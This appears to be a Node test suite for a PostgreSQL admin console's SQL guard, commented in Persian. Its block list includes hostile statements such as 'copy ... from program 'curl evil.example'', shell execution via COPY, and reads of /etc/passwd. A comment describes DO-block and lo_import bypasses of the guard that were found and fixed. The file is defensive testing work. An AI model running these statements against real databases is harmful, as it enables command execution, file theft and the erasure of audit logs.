import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { inspectSql, stripLiterals } from "@/lib/admin/sql-guard";

/**
 * این تست‌ها قرارداد امنیتیِ کنسول SQL‌اند.
 *
 * کنسول عمداً قدرتِ کامل می‌دهد؛ چیزی که اینجا بررسی می‌شود آن مشتِ کوچکِ
 * دستورهایی است که *هیچ* کارِ مشروعی در یک صفحهٔ وب ندارند.
 */

describe("جدا کردن رشته‌ها و کامنت‌ها", () => {
  test("محتوای رشته دیگر شبیه دستور نیست", () => {
    const out = stripLiterals("insert into notes (body) values ('drop database sarva')");
    assert.ok(!out.includes("drop database"), out);
    assert.ok(out.includes("insert into notes"), out);
  });

  test("کامنت خطی و بلوکی حذف می‌شوند", () => {
    assert.ok(!stripLiterals("select 1; -- drop database x").includes("drop database"));
    assert.ok(!stripLiterals("select 1; /* drop database x */").includes("drop database"));
  });

  test("کامنت بلوکیِ تودرتو هم", () => {
    const out = stripLiterals("select 1 /* a /* b */ c */ ; delete from users where id = 1");
    assert.ok(!out.includes("a"), out);
    assert.ok(out.includes("delete from users"), out);
  });

  test("رشتهٔ دلاری", () => {
    assert.ok(!stripLiterals("select $$drop database x$$").includes("drop database"));
    assert.ok(!stripLiterals("select $t$drop database x$t$").includes("drop database"));
  });

  test("شناسهٔ داخل گیومه، بدون گیومه نگه داشته می‌شود", () => {
    assert.ok(stripLiterals('delete from "admin_audit_log"').includes("admin_audit_log"));
  });

  test("کوتیشنِ فرارشده رشته را زودتر نمی‌بندد", () => {
    const out = stripLiterals("select 'it''s fine; drop database x'");
    assert.ok(!out.includes("drop database"), out);
  });
});

describe("دستورهای ممنوع", () => {
  const forbidden = [
    "drop database sarva",
    "DROP DATABASE sarva",
    "drop schema public cascade",
    "create database x",
    "alter system set log_statement = 'all'",
    "copy users from program 'curl evil.example'",
    "copy (select 1) to program 'sh'",
    "select pg_read_file('/etc/passwd')",
    "select pg_ls_dir('/')",
    "select pg_terminate_backend(1)",
    "create extension dblink",
    "grant all on users to public",
    "create role attacker superuser",
    "alter user sarva with password 'x'",
  ];

  for (const sql of forbidden) {
    test(`رد می‌شود: ${sql.slice(0, 40)}`, () => {
      const out = inspectSql(sql);
      assert.ok(out.blocked, `اجازه داده شد: ${sql}`);
      assert.equal(out.blocked!.kind, "forbidden");
    });
  }

  test("با فاصله و خط تازهٔ اضافه هم گرفته می‌شود", () => {
    assert.ok(inspectSql("drop\n\n   database   sarva").blocked);
  });

  test("کوئری‌های عادی رد نمی‌شوند", () => {
    for (const sql of [
      "select * from users limit 10",
      "insert into vocab_words (grade, lesson, word, meaning) values ('دهم', 1, 'a', 'b')",
      "update questions set difficulty = 'hard' where type = 'audio'",
      "delete from vocab_words where grade = 'دهم' and lesson = 1",
      "with q as (insert into questions (type) values ('text') returning id) select * from q",
    ]) {
      assert.equal(inspectSql(sql).blocked, null, `بی‌دلیل رد شد: ${sql}`);
    }
  });
});

describe("جدول‌های فقط‌خواندنی", () => {
  test("نوشتن روی لاگ ممیزی ممکن نیست", () => {
    for (const sql of [
      "delete from admin_audit_log",
      "update admin_audit_log set summary = 'x'",
      "insert into admin_audit_log (action) values ('x')",
      "truncate admin_audit_log",
      "truncate table admin_audit_log",
      "drop table admin_audit_log",
      "drop table if exists admin_audit_log",
      "alter table admin_audit_log drop column summary",
      "delete from public.admin_audit_log",
      'delete from "admin_audit_log"',
    ]) {
      const out = inspectSql(sql);
      assert.ok(out.blocked, `اجازه داده شد: ${sql}`);
      assert.equal(out.blocked!.kind, "protected-table");
    }
  });

  test("نوشتن روی schema_migrations هم", () => {
    assert.ok(inspectSql("delete from schema_migrations").blocked);
  });

  test("ولی خواندنشان آزاد است", () => {
    assert.equal(inspectSql("select * from admin_audit_log limit 5").blocked, null);
    assert.equal(inspectSql("select count(*) from schema_migrations").blocked, null);
  });
});

describe("هشدارها", () => {
  test("delete بدون where", () => {
    const out = inspectSql("delete from vocab_words;");
    assert.equal(out.blocked, null);
    assert.ok(out.warnings.some((w) => w.includes("delete")), out.warnings.join(" | "));
  });

  test("ولی delete با where هشدار نمی‌دهد", () => {
    const out = inspectSql("delete from vocab_words where lesson = 1;");
    assert.equal(out.warnings.length, 0, out.warnings.join(" | "));
  });

  test("update بدون where", () => {
    const out = inspectSql("update users set role = 'admin'");
    assert.ok(out.warnings.some((w) => w.includes("update")));
  });

  test("دست بردن در جدول کاربران همیشه هشدار دارد", () => {
    const out = inspectSql("update users set full_name = 'x' where id = '1'");
    assert.ok(out.warnings.some((w) => w.includes("argon2")), out.warnings.join(" | "));
  });

  test("alter table یادآوری migration می‌دهد", () => {
    const out = inspectSql("alter table vocab_words add column note text");
    assert.ok(out.warnings.some((w) => w.includes("migration")));
  });

  test("یک select ساده هیچ هشداری ندارد", () => {
    assert.deepEqual(inspectSql("select 1").warnings, []);
  });
});

/**
 * ⚠️ دو راهِ فرار از سیاستِ خودِ همین محافظ، که هر دو روی دیتابیس محلی
 * آزموده و بسته شدند:
 *
 * ۱) بلوکِ DO. این محافظ متن را می‌خواند؛ DO دستورِ واقعی را داخل یک رشته
 *    می‌گذارد و `stripLiterals` — که وظیفه‌اش حذف رشته‌هاست تا کلمهٔ «drop»
 *    داخل یک متن کوئریِ بی‌گناه را مسدود نکند — دقیقاً همان رشته را
 *    برمی‌دارد. یعنی
 *    `do $$ begin execute 'delete from admin_audit_log'; end $$`
 *    نه اخطار می‌گرفت نه به سدِ جدولِ محافظت‌شده می‌خورد: گارد هیچ دستوری
 *    نمی‌دید. روی دیتابیس محلی اجرا شد و ردیف‌ها پاک شدند.
 *
 * ۲) `lo_import`. `pg_read_file` مسدود بود ولی این نبود، با همان توانایی.
 *    روی دیتابیس محلی `/etc/hostname` خوانده شد.
 */
describe("راه‌های فرار از خودِ محافظ", () => {
  const blocked = (sql: string) => inspectSql(sql).blocked !== null;

  test("بلوک DO مسدود می‌شود", () => {
    assert.ok(blocked("do $$ begin execute 'delete from admin_audit_log'; end $$"));
  });

  test("بلوک DO با تگِ نام‌دار هم مسدود می‌شود", () => {
    assert.ok(blocked("do $body$ begin execute 'drop table users'; end $body$"));
  });

  test("بلوک DO بعد از یک دستورِ بی‌گناه هم مسدود می‌شود", () => {
    assert.ok(blocked("select 1; do $$ begin execute 'delete from users'; end $$"));
  });

  test("CALL مسدود می‌شود — یک procedure می‌تواند خودش commit کند", () => {
    // اگر procedure داخل خودش commit کند، از rollbackِ حالت پیش‌نمایش
    // بیرون می‌زند؛ یعنی «پیش‌نمایش امن است» دیگر راست نیست.
    assert.ok(blocked("call some_proc()"));
  });

  test("lo_import مسدود می‌شود", () => {
    assert.ok(blocked("select lo_import('/etc/passwd')"));
  });

  test("lo_export هم مسدود می‌شود — قرینه‌اش، نوشتن روی سرور", () => {
    assert.ok(blocked("select lo_export(1234, '/tmp/x')"));
  });

  test("pg_stat_file هم مسدود می‌شود", () => {
    assert.ok(blocked("select pg_stat_file('/etc/passwd')"));
  });

  test("set session authorization مسدود می‌شود", () => {
    assert.ok(blocked("set session authorization postgres"));
  });

  test("set role مسدود می‌شود", () => {
    assert.ok(blocked("set role postgres"));
  });
});

/**
 * نیمهٔ دومِ کار: الگوهای تازه نباید کوئریِ سالم را بگیرند. این کنسول ابزارِ
 * کارِ روزمره است و یک مسدودسازیِ بی‌جا آن را بی‌مصرف می‌کند.
 */
describe("کوئری‌های سالم که نباید قربانیِ الگوهای تازه شوند", () => {
  test("update ... set role = ... مسدود نمی‌شود", () => {
    // ⚠️ مهم‌ترین تستِ اینجا. الگوی `set role` اگر به ابتدای دستور مقید
    // نباشد این را می‌گیرد — و خودِ محافظ در متنِ اخطارهایش این را کارِ
    // مجاز و متعارف می‌داند.
    assert.equal(inspectSql("update users set role = 'admin' where id = 1").blocked, null);
  });

  test("ستونی به نامِ do یا call مسدود نمی‌شود", () => {
    assert.equal(inspectSql("select do_not_touch, call_count from stats").blocked, null);
  });

  test("متنی که کلمهٔ do داخلش است مسدود نمی‌شود", () => {
    assert.equal(inspectSql("select * from notes where body = 'do this later'").blocked, null);
  });

  test("insert معمولی مسدود نمی‌شود — کارِ اصلیِ این کنسول", () => {
    assert.equal(
      inspectSql("insert into questions (title) values ('وزن این بیت چیست؟')").blocked,
      null,
    );
  });

  test("drop table همچنان مجاز است و فقط اخطار می‌گیرد", () => {
    // یادآوری اینکه این کنسول ابزارِ DBA است، نه فرمی فقط‌خواندنی.
    const r = inspectSql("drop table scratch_table");
    assert.equal(r.blocked, null);
    assert.ok(r.warnings.some((w) => w.includes("drop table")));
  });
});
